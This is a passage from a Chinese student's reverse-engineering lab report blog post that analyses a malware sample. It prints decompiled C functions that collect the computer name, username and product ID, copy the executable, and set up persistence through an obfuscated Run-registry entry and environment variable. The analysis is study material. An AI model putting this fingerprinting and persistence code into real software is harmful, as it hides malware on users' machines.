+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_401740</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  DWORD nSize; <span class="comment">// 存储要获取的字符串的大小</span></span><br><span class="line">  DWORD pcbData; <span class="comment">// 存储注册表数据的大小</span></span><br><span class="line">  DWORD pcbBuffer; <span class="comment">// 存储要获取的用户名称的大小</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取计算机名称，并存储在Buffer中</span></span><br><span class="line">  nSize = <span class="number">255</span>;</span><br><span class="line">  GetComputerNameA(Buffer, &amp;nSize);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取注册表中的产品名称，并存储在unk_413AD0中</span></span><br><span class="line">  pcbData = <span class="number">0x2000</span>;</span><br><span class="line">  RegGetValueA(</span><br><span class="line">    HKEY_LOCAL_MACHINE, <span class="comment">// 主键</span></span><br><span class="line">    <span class="string">&quot;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion&quot;</span>, <span class="comment">// 子键路径</span></span><br><span class="line">    <span class="string">&quot;ProductName&quot;</span>, <span class="comment">// 值名称</span></span><br><span class="line">    <span class="number">0xFFFFu</span>, <span class="comment">// 标志，指定数据类型</span></span><br><span class="line">    <span class="number">0</span>, <span class="comment">// 保留</span></span><br><span class="line">    &amp;unk_413AD0, <span class="comment">// 存储获取的值</span></span><br><span class="line">    &amp;pcbData); <span class="comment">// 获取的值的大小</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取用户名称，并存储在byte_412F90中</span></span><br><span class="line">  pcbBuffer = <span class="number">255</span>;</span><br><span class="line">  GetUserNameA(byte_412F90, &amp;pcbBuffer);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 返回值</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>该函数的主要作用是获取计算机名、用户名，并将它们保存到全局变量中。</p>
+<blockquote>
+<p>下面再分析一下函数 sub_402740</p>
+</blockquote>
+<h4 id="sub-402740"><a href="#sub-402740" class="headerlink" title="sub_402740"></a>sub_402740</h4><p><strong>这个函数是为了复制文件</strong></p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_402740</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">errno_t</span> v0; <span class="comment">// 用于存储第一个文件打开的错误码</span></span><br><span class="line">  <span class="type">errno_t</span> v1; <span class="comment">// 用于存储第二个文件打开的错误码</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// 用于存储每次读取的字符</span></span><br><span class="line"></span><br><span class="line">  FILE *Stream; <span class="comment">// 第一个文件的文件指针</span></span><br><span class="line">  FILE *v5; <span class="comment">// 第二个文件的文件指针</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 尝试以只读模式打开第一个文件</span></span><br><span class="line">  v0 = fopen_s(&amp;Stream, Filename, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  <span class="comment">// 尝试以写入模式打开第二个文件</span></span><br><span class="line">  v1 = fopen_s(&amp;v5, (<span class="type">const</span> <span class="type">char</span> *)Path, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果第一个文件打开失败，则返回错误码 -1</span></span><br><span class="line">  <span class="keyword">if</span> (v0)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果第二个文件打开失败，则关闭第一个文件，并返回错误码 -1</span></span><br><span class="line">  <span class="keyword">if</span> (v1)</span><br><span class="line">  &#123;</span><br><span class="line">    fclose(Stream);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 循环读取第一个文件的内容，并将其写入到第二个文件中，直到到达文件末尾</span></span><br><span class="line">  <span class="keyword">for</span> (i = fgetc(Stream); !feof(Stream); i = fgetc(Stream))</span><br><span class="line">    fputc(i, v5);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 关闭文件流</span></span><br><span class="line">  fclose(v5);</span><br><span class="line">  fclose(Stream);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 返回成功码 0</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>这个函数的作用是将一个文件的内容复制到另一个文件中，如果其中一个文件打开失败，则返回 -1。</p>
+<blockquote>
+<p>下面再分析一下函数 sub_401570</p>
+</blockquote>
+<h4 id="sub-401570"><a href="#sub-401570" class="headerlink" title="sub_401570"></a>sub_401570</h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">sub_401570</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// 用于存储字符串长度</span></span><br><span class="line">  BYTE *v1; <span class="comment">// 用于存储数据的指针</span></span><br><span class="line">  HKEY phkResult; <span class="comment">// 用于操作注册表键的句柄</span></span><br><span class="line">  DWORD cbData; <span class="comment">// 用于存储数据的字节数</span></span><br><span class="line">  DWORD Type; <span class="comment">// 用于存储数据的类型</span></span><br><span class="line">  BYTE Data[<span class="number">1024</span>]; <span class="comment">// 用于存储注册表数据的缓冲区</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 尝试打开注册表中的键</span></span><br><span class="line">  <span class="keyword">if</span> ( RegOpenKeyExA(HKEY_LOCAL_MACHINE, <span class="string">&quot;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion&quot;</span>, <span class="number">0</span>, <span class="number">0x101u</span>, &amp;phkResult) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 如果打开失败，则将 Buffer 和 &quot;@!&quot; 追加到 byte_4137C0 中</span></span><br><span class="line">    <span class="built_in">strcat</span>(byte_4137C0, Buffer);</span><br><span class="line">    <span class="built_in">strcat</span>(byte_4137C0, <span class="string">&quot;@!&quot;</span>);</span><br><span class="line">    <span class="comment">// 计算 byte_412F90 的长度并加 1</span></span><br><span class="line">    v0 = <span class="built_in">strlen</span>(byte_412F90) + <span class="number">1</span>;</span><br><span class="line">    v1 = (BYTE *)byte_412F90; <span class="comment">// 将 byte_412F90 的地址赋给 v1</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 如果成功打开注册表键，则查询 &quot;ProductId&quot; 的值并将其存储在 Data 中</span></span><br><span class="line">    cbData = <span class="number">1023</span>;</span><br><span class="line">    RegQueryValueExA(phkResult, <span class="string">&quot;ProductId&quot;</span>, <span class="number">0</span>, &amp;Type, Data, &amp;cbData);</span><br><span class="line">    RegCloseKey(phkResult); <span class="comment">// 关闭注册表键</span></span><br><span class="line">    <span class="comment">// 将 Buffer、&quot;##&quot;、byte_412F90 和 &quot;@@&quot; 追加到 byte_4137C0 中</span></span><br><span class="line">    <span class="built_in">strcat</span>(byte_4137C0, Buffer);</span><br><span class="line">    <span class="built_in">strcat</span>(byte_4137C0, <span class="string">&quot;##&quot;</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(byte_4137C0, byte_412F90);</span><br><span class="line">    <span class="built_in">strcat</span>(byte_4137C0, <span class="string">&quot;@@&quot;</span>);</span><br><span class="line">    v0 = <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)Data) + <span class="number">1</span>; <span class="comment">// 计算 Data 的长度并加 1</span></span><br><span class="line">    v1 = Data; <span class="comment">// 将 Data 的地址赋给 v1</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 将 v1 指向的 v0 字节的数据复制到 byte_4137C0 中</span></span><br><span class="line">  qmemcpy(&amp;byte_4137C0[<span class="built_in">strlen</span>(byte_4137C0)], v1, v0);</span><br><span class="line">  <span class="keyword">return</span> byte_4137C0; <span class="comment">// 返回 byte_4137C0 的指针</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>从注册表中获取 “ProductId” 值，然后将一些字符串连接起来，并返回结果。</p>
+<blockquote>
+<p>再看看 sub_401360</p>
+</blockquote>
+<h4 id="sub-401360"><a href="#sub-401360" class="headerlink" title="sub_401360"></a>sub_401360</h4><p><strong>这个函数是为了保活</strong></p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_401360</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> CHAR *v0; <span class="comment">// 指向注册表键名的指针</span></span><br><span class="line">  <span class="type">const</span> CHAR *v1; <span class="comment">// 指向注册表值名的指针</span></span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// 字符串缓冲区指针</span></span><br><span class="line">  HKEY phkResult; <span class="comment">// 存储打开的注册表键的句柄</span></span><br><span class="line">  LPCSTR lpSubKey; <span class="comment">// 存储注册表子键路径的指针</span></span><br><span class="line">  <span class="type">const</span> CHAR *v6; <span class="comment">// 指向注册表值名的指针</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取注册表子键路径并存储在lpSubKey中</span></span><br><span class="line">  lpSubKey = sub_4026E0(<span class="string">&quot;Tpguxbsf]Njdsptpgu&quot;</span>, <span class="number">1</span>);                                       <span class="comment">//解密之后是Software\Microsoft</span></span><br><span class="line">  <span class="built_in">strcat</span>((<span class="type">char</span> *)lpSubKey, sub_4026E0(<span class="string">&quot;]Xjoepxt]Dvssfouwfstjpo]&quot;</span>, <span class="number">1</span>));                    <span class="comment">//解密之后是\Windows\Currentversion</span></span><br><span class="line">  *(_DWORD *)&amp;lpSubKey[<span class="built_in">strlen</span>(lpSubKey)] = <span class="number">7238994</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取注册表值名并存储在v0中</span></span><br><span class="line">  v0 = sub_4026E0(<span class="string">&quot;Efgbvmu2&quot;</span>, <span class="number">1</span>);                                                         <span class="comment">//Default1</span></span><br><span class="line">  <span class="comment">// 获取注册表值名并存储在v1中</span></span><br><span class="line">  v1 = sub_4026E0(<span class="string">&quot;TfU&quot;</span>, <span class="number">1</span>);                                                             <span class="comment">//Set</span></span><br><span class="line">  <span class="comment">// 存储原始的注册表值名以备后用</span></span><br><span class="line">  v6 = v1;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果注册表中没有指定的注册表值，则执行以下操作</span></span><br><span class="line">  <span class="keyword">if</span> (RegQueryValueExA(<span class="number">0</span>, v0, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 构建字符串并存储在v2中</span></span><br><span class="line">    v2 = sub_4026E0(<span class="string">&quot;dne&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(v2, sub_4026E0(<span class="string">&quot;!0d!tubsu!&amp;TfU&amp;!&quot;</span>, <span class="number">1</span>));                                        <span class="comment">// /c start %SeT%</span></span><br><span class="line">    <span class="built_in">strcat</span>(v2, sub_4026E0(<span class="string">&quot;&#x27;&#x27;!&quot;</span>, <span class="number">1</span>));                                                     <span class="comment">//&amp;&amp;</span></span><br><span class="line">    <span class="built_in">strcat</span>(v2, <span class="string">&quot;exit&quot;</span>);</span><br><span class="line">    <span class="comment">// 打开注册表键</span></span><br><span class="line">    RegOpenKeyExA(HKEY_CURRENT_USER, lpSubKey, <span class="number">0</span>, <span class="number">0xF003Fu</span>, &amp;phkResult);</span><br><span class="line">    <span class="comment">// 设置注册表值</span></span><br><span class="line">    RegSetValueExA(phkResult, v0, <span class="number">0</span>, <span class="number">1u</span>, (<span class="type">const</span> BYTE *)v2, <span class="built_in">strlen</span>(v2));</span><br><span class="line">    <span class="comment">// 关闭注册表键</span></span><br><span class="line">    RegCloseKey(phkResult);</span><br><span class="line">    <span class="comment">// 恢复注册表值名为原始值</span></span><br><span class="line">    v1 = v6;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果注册表中没有指定的注册表值，则执行以下操作</span></span><br><span class="line">  <span class="keyword">if</span> (RegQueryValueExA(<span class="number">0</span>, v1, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 打开注册表键</span></span><br><span class="line">    RegOpenKeyExA(HKEY_CURRENT_USER, <span class="string">&quot;Environment&quot;</span>, <span class="number">0</span>, <span class="number">0xF003Fu</span>, &amp;phkResult);</span><br><span class="line">    <span class="comment">// 设置注册表值</span></span><br><span class="line">    RegSetValueExA(phkResult, v1, <span class="number">0</span>, <span class="number">1u</span>, Path, <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)Path));</span><br><span class="line">    <span class="comment">// 关闭注册表键</span></span><br><span class="line">    RegCloseKey(phkResult);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 返回值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>操作 Windows 注册表，为了保活，设置了一些注册表键值。</p>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> 汇编语言与逆向工程实验报告9 &amp;&amp; 期中测验</li>
+        <li><strong>作者:</strong> W1ndys</li>
+        <li><strong>创建于
+                :</strong> 2024-04-27 13:31:25</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2025-02-23 13:37:18
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://blog.w1ndys.top/posts/b681040b.html
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                版权所有 &#169 W1ndys，禁止转载。
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/">#汇编语言</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/">#逆向工程</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/QFNU/">#QFNU</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/posts/8790bb83.html">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">网络安全实验报告6——使用Python实现SYN Flood攻击实验</span>
+						<span class="post-nav-item">上一篇</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/posts/d77eff50.html">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">操作系统实验1——L1 什么是操作系统</span>
+						<span class="post-nav-item">下一篇</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        评论
+    </div>
+    
+
+        
+            
+    <div id="giscus-container"></div>
+    <script data-swup-reload-script defer>
+        async function loadGiscus() {
+            const giscusConfig = {
+                'src': 'https://giscus.app/client.js',
+                'data-repo': 'W1ndys/Blog',
+                'data-repo-id': 'R_kgDOLaRaXw',
+                'data-category': 'Show and tell',
+                'data-category-id': 'DIC_kwDOLaRaX84CeBp5',
+                'data-mapping': 'url',
+                'data-strict': '0',
+                'data-reactions-enabled': '1',
+                'data-emit-metadata': '1',
+                'data-theme': 'preferred_color_scheme',
+                'data-lang': 'zh-CN',
+                'data-input-position': 'top',
+                'data-loading': 'lazy',
+                'crossorigin': 'anonymous',
+                'async': true
+            }
+            const giscusScript = document.createElement('script');
+            for (const key in giscusConfig) {
+                giscusScript.setAttribute(key, giscusConfig[key]);
+            }
+            document.getElementById('giscus-container').appendChild(giscusScript);
+        }
+        if ('true') {
+            let loadGiscusTimeout = setTimeout(() => {
+                loadGiscus();
+                clearTimeout(loadGiscusTimeout);
+            }, 1000);
+        } else {
+            document.addEventListener('DOMContentLoaded', loadGiscus);
+        }
+    </script>
+
+
+        
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">目录</div>
+		<div class="page-title">汇编语言与逆向工程实验报告9 &amp;&amp; 期中测验</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%80%86%E5%90%91%E7%97%85%E6%AF%92"><span class="nav-text">逆向病毒</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF"><span class="nav-text">文件基础信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E5%87%BD%E6%95%B0"><span class="nav-text">主函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sub-402920"><span class="nav-text">sub_402920</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sub-401130"><span class="nav-text">sub_401130</span></a></li></ol></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+            <div class="customize-info my-1">Powered by <a href="https://github.com/W1ndys" target="_blank">W1ndys</a></div>
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">W1ndys</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共撰写了 193 篇文章
+                    </span>
+                    
+                        <span>
+                            共 224.3k 字
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">访问人数</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">总访问量</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+            
+                
+        
+                
+        
+                
+
+                    
+                        <script data-swup-reload-script data-pjax src="/js/Capoo.js"></script>
+                    
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+		<li class="right-bottom-tools rss flex justify-center items-center">
+			<a class="flex justify-center items-center" href="/atom.xml" target="_blank">
+				<i class="fa-regular fa-rss"></i>
+			</a>
+		</li>
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="站内搜索您需要的内容..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+<script  src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/js/build/libs/Swup.min.js" ></script><script  src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/js/build/libs/SwupSlideTheme.min.js" ></script><script  src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/js/build/libs/SwupScriptsPlugin.min.js" ></script><script  src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/js/build/libs/SwupProgressPlugin.min.js" ></script><script  src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/js/build/libs/SwupScrollPlugin.min.js" ></script><script  src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/js/build/libs/SwupPreloadPlugin.min.js" ></script>
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	<script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/js/build/tools/imageViewer.js" ></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/js/build/utils.js" ></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/js/build/main.js" ></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/js/build/layouts/navbarShrink.js" ></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/js/build/tools/scrollTopBottom.js" ></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/js/build/tools/lightDarkSwitch.js" ></script><script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/js/build/layouts/categoryList.js" ></script>
+
+
+    <script type="module" src="https://evan.beee.top/projects/hexo-theme-redefine@2.8.2/source/js/build/tools/localSearch.js" ></script>
+
+
+
